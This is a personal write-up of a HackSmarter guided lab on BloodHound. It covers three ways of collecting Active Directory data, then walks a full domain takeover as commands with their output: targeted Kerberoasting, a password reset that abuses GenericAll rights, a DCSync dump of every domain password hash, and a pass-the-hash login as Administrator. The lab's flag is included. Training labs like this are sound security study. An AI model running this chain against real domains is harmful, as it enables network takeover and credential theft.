---
title: "Guided Lab: Bloodhound"
author: Glueyy
date: 2026-06-29
description: "HackSmarter - Guided Lab: Bloodhound - personal notes and thought process"
tags: ["Guided Lab"]
---
BloodHound uses a Neo4j graph database.

The first step with BloodHound is deciding how to collect the loot. Below I will list 3 distinct ways taught in this lesson.

## Collection Method 1 — bloodhound-python

Used as such:

`bloodhound-python -u 'username' -p 'password' -d [DOMAIN] -dc [DC-HOSTNAME] -c All -ns [DC-IP]`

The result is many JSON files with our loot:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodhound-python -u 'pentest' -p 'HackSmarter123!' -d hacksmarter.hsm -dc dc01.hacksmarter.hsm -c All -ns 10.1.176.120
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hacksmarter.hsm
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.hacksmarter.hsm
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.hacksmarter.hsm
INFO: Found 17 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.hacksmarter.hsm
INFO: Done in 00M 18S

┌──(kali㉿kali)-[~/Downloads]
└─$ ls
20260629172500_computers.json
20260629172500_gpos.json
20260629172500_users.json
20260629172500_containers.json
20260629172500_groups.json
20260629172500_domains.json
20260629172500_ous.json
```

## Collection Method 2 — netexec (nxc)

Running the command is somewhat the same:

`nxc ldap [DC-IP] -u 'username' -p 'password' --bloodhound --collection All --dns-server [DC-IP]`

This results in the output shown below, and the verbose output confirms it has already gone ahead and made a zip of the JSON and stored it in the nxc logs directory:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap 10.1.176.120 -u 'pentest' -p 'HackSmarter123!' --bloodhound --collection All --dns-server 10.1.176.120
LDAP        10.1.176.120    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.hsm) (signing:None) (channel binding:No TLS cert)
LDAP        10.1.176.120    389    DC01             [+] hacksmarter.hsm\pentest:HackSmarter123!
LDAP        10.1.176.120    389    DC01             [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
LDAP        10.1.176.120    389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP        10.1.176.120    389    DC01             Excluded collection methods:
LDAP        10.1.176.120    389    DC01             Bloodhound data collection completed in 0M 23S
LDAP        10.1.176.120    389    DC01             Collecting ADCS data (CertiHound)...
LDAP        10.1.176.120    389    DC01             Found 0 certificate templates
LDAP        10.1.176.120    389    DC01             Found 0 Enterprise CAs
LDAP        10.1.176.120    389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.176.120_2026-06-29_173127_bloodhound.zip
```

## Collection Method 3 — SharpHound

SharpHound is inherently unique from the last two: it is written in C# as a Windows executable, so it needs to be run on the Windows system itself.

First transfer the file to a Windows machine — I used Evil-WinRM.

Then, once on the machine, we run the exe and send the loot back. We run the exe with `.\SharpHound.exe -c All`.

The output is a zip and a .bin file:

```
*Evil-WinRM* PS C:\Users\pentest\Documents> ls


    Directory: C:\Users\pentest\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/29/2026  10:04 PM          31017 20260629220443_BloodHound.zip
-a----         6/29/2026  10:01 PM        1351680 SharpHound.exe
-a----         6/29/2026  10:04 PM           1335 ZDZkMDFlYmMtY2Q5Mi00ZWUxLWE4MWMtNTdjOWIyMjFkNjcy.bin
```

## Standing Up BloodHound

Install BloodHound CE using BloodHound CLI (from [https://github.com/SpecterOps/BloodHound_CLI](https://github.com/SpecterOps/BloodHound_CLI)). Then extract it and start it up:

```
sudo bloodhound-cli install
[+] Checking the status of Docker and the Compose plugin...
[+] Docker and the Compose plugin checks have passed
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[*] A development YAML file already exists in the current directory. Do you want to overwrite it? [y/n]: y
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
 app-db Pulling
 graph-db Pulling
 bloodhound Pulling
 bloodhound Pulled
 graph-db Pulled
 app-db Pulled
 Container bloodhound-graph-db-1  Running
 Container bloodhound-app-db-1  Running
 Container bloodhound-bloodhound-1  Running
 Container bloodhound-app-db-1  Waiting
 Container bloodhound-graph-db-1  Waiting
 Container bloodhound-app-db-1  Healthy
 Container bloodhound-graph-db-1  Healthy
[+] BloodHound is ready to go!
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

After I uploaded the file into BloodHound, we can see that it starts mapping nodes for us.

Immediately, one thing stands out to me: our user has control over another account (a GenericAll edge from PENTEST to BACKUP_SVC), which usually means we may be able to perform an attack against that account.

## The Challenge — Compromising the Domain Controller

The goal: **What is the flag located at C:\Users\Administrator\Desktop\root.txt?**

First I tried targeted Kerberoasting to get a hash and crack it for our GenericAll-controlled user, but with rockyou hitting nothing I decided to instead use the password-reset method to get in.

```
┌──(kali㉿kali)-[~/hacksmarter/bloodhound_guided]
└─$ nxc ldap 10.1.176.120 -u pentest -p 'HackSmarter123!' --kerberoasting targeted_kerberoasting.txt --targeted-kerberoast backup_svc

┌──(kali㉿kali)-[~/hacksmarter/bloodhound_guided]
└─$ cat hash_backupsvc.txt
$krb5tgs$23$*backup_svc$HACKSMARTER.HSM$hacksmarter.hsm\backup_svc*$2f257e2a698539ccd0b6b4cf5fac8da0$9746bf42341d9b278e8b398bc3019c27ddeb458494ff04a584ce67b2949de1eb436046e7b8559bb9bd380cfeedebce9a330be850583269323b4ad269dbdaa0950cb6760df11be51158a788800dd7b2579e60b842e224804c7e4cde9adae7860617ab845ab7d19ffdf00f4df40c20714753ad7c594dec1b0bb0370969da56e199643df93402ce371110e0598df3f609a92f8e5ecefe8356e5226bbfe07a8bd51a77c9ecdd10f54e9f1e8f1b3c45a39dfd57abd75bf581de77a88f64c4149aa814423bb47fa81cfaad4fc671812921e686f6b98d0efb4b1a13bea0ea5276898eb08f8bdf34c80ba1cdc33e85ebad85ef3d0ee1a1cc1f0b569c94f7c9c4adc9713ef4fab33ee237587ce78bbcb96c4daf778dd9f44a1d0ad7577d0ddc04ba264793aede9a30f6d4f059df0e5c93e40c0652b8fa77db79dc90649e3f75a6d7905f404a98ea174480d63cd10dabb84261433a086b6a93d32b0050e83132c403cd41451dbe45b48d71c3286e5bdd3634cf31fa33dbb97b589d5ba547037a25b60694a2bc6a9dbb780197e3487e48b01547801d0b309b44f5a4c6a1ee1e1124e30eb01cc1a650a1232b5977107700fe99f8dbd14aeac13278234d7c432e77ce74e423ff3a39af3772d5d8916562b14beb159ea416629272b9373abddce82b84babc3a2f701ebc9fdb51c5a58e779c7b5a5a9cfbe272bb58cf6c5f688d6fcdcab4d78a73bd718052b77a784127cd90034194a4441ee5a8b87700e3c7c3ca635e500fa3059e692b1ceea84fd66a9593804db9232eb4e25426f9c12ce602b4decd3625535ba65e8a343d79420150e96c19939fda196766b9a07af0ff29fe97c864105bd47bf6a03ce477edd53c2b3594cef4856731adb19e454e9f7ca0367c07bcec01eebdca2eb85ed85785b6263232eadf6271d44d5c960fb99a2514c73dfc35a8d45d88028e1d7b71c9d346c0b87406799cecd3244cc6c64ee4907c6f1d5b2f1f6acb8fc656f43699351b5eb9a38024066b064f2a3b9d3279fc4cfa3811dd6f1b4e1362cffe8ff4c3b2b7e2024eec637aab6ffb3b76b6d20fa2479a53cd779e0f2636b3832d9ef63382702368b24b8e888e96a31c98fe6f623f9acc547ac3f7164f80137d35ff93f8b1516b102e5a365686109380b3561907ab4756f4f6c11b73296eb23b15b162a078ef24f6440882f60a71ba20c4019f5c2af768de99ed51581a1a782771c99da19d977a8f63273c581d57259ce568901b888145bb5aa78ed8cf99923435a68ed77663c4a992860a67d530e0283339790a6a54765a8bc30912794bb6b0fba779664994b27bc62d5479be1a840886409089f18cd5de2aea52abfe2ec153f8943e43fdc422b051646619aee65ea771d094e6096e9669678a12f6694a4280e6b17c85f10da99ebcc1f7ece8aceb3b5ba9abd7f641cfb863475ecabda21320200adf9f396f806e6b449b606c639bd3f80cc6affe38
```

### Full Compromise Path

First, use the fact that you have GenericAll over another account to change its password with the following command:

```
net rpc password backup_svc 'NewPass123!' -U 'hacksmarter.hsm/pentest%HackSmarter123!' -S 10.1.176.120
```

The above command takes advantage of the fact that our user has GenericAll over backup_svc, which includes the right to reset its password without knowing the current one.

We can confirm the credential change worked with this command:

```
nxc smb dc01.hacksmarter.hsm -u backup_svc -p 'NewPass123!'
SMB         10.1.176.120    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.176.120    445    DC01             [-] Provided Neo4J credentials (neo4j:password) are not valid.
SMB         10.1.176.120    445    DC01             [+] hacksmarter.hsm\backup_svc:NewPass123!
```

After trying to remote into the host as backup_svc and failing (the account is not in Remote Management Users, so WinRM was refused), I pivoted to looking at the user's rights in BloodHound and found that it has the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights (GetChanges / GetChangesAll) over the target domain. Inside BloodHound it states:

> You may perform a DCSync attack to get the password hash of an arbitrary principal using Impacket's secretsdump.py example script:

```
secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'
```

Running this command completely dumped the hashes for the domain. (Note: the `RemoteOperations failed ... rpc_s_access_denied` line is expected — the registry/SAM method was denied, but secretsdump fell back to the DRSUAPI replication method, which our DCSync rights allow.)

```
┌──(kali㉿kali)-[~/hacksmarter/bloodhound_guided]
└─$ secretsdump.py 'hacksmarter.hsm'/'backup_svc':'NewPass123!'@'dc01.hacksmarter.hsm'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:661bc567e0a4ce68524cf362e229e89c:::
hacksmarter.hsm\alice_hr:1103:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\bob_finance:1104:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\charlie_it:1105:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\diana_sales:1106:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\eve_marketing:1107:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\frank_ops:1108:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\grace_legal:1109:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\harry_dev:1110:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\irene_support:1111:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\jack_exec:1112:aad3b435b51404eeaad3b435b51404ee:95eebf2c9e62455c37aaebc96f7dca2e:::
hacksmarter.hsm\tyler_adm:1113:aad3b435b51404eeaad3b435b51404ee:768b876462ffa9ffc9e39f65a89fcdad:::
hacksmarter.hsm\pentest:1114:aad3b435b51404eeaad3b435b51404ee:27d772642f14204e804440e4b7dac7e6:::
backup_svc:2101:aad3b435b51404eeaad3b435b51404ee:25451b15eeabfa492d9a18442a6e914b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0fd5cbd592a0a06b688b1a974e81a3f9:::
[*] Kerberos keys grabbed
```

This gave me the Administrator NT hash, which I used to complete the lab by logging in as Administrator via pass-the-hash:

```
┌──(kali㉿kali)-[~/hacksmarter/bloodhound_guided]
└─$ evil-winrm -i dc01.hacksmarter.hsm -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----          6/8/2026   7:52 PM             37 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
HSM{904b08dd63414950a6140a3537124893}
```

## Summary of the Attack Path

1. Authenticated as `pentest` and collected BloodHound data.
2. BloodHound revealed `pentest` has **GenericAll** over `backup_svc`.
3. Abused GenericAll to reset `backup_svc`'s password (Kerberoasting first, but the hash would not crack against rockyou).
4. `backup_svc` held **DS-Replication-Get-Changes / Get-Changes-All** (DCSync rights) over the domain.
5. Ran DCSync via secretsdump.py to dump all domain hashes, including the Administrator hash.
6. Pass-the-hash as Administrator → read root.txt.

**Flag:** `HSM{904b08dd63414950a6140a3537124893}`


Completion link
https://www.hacksmarter.org/completion/366cae30685fd9dd
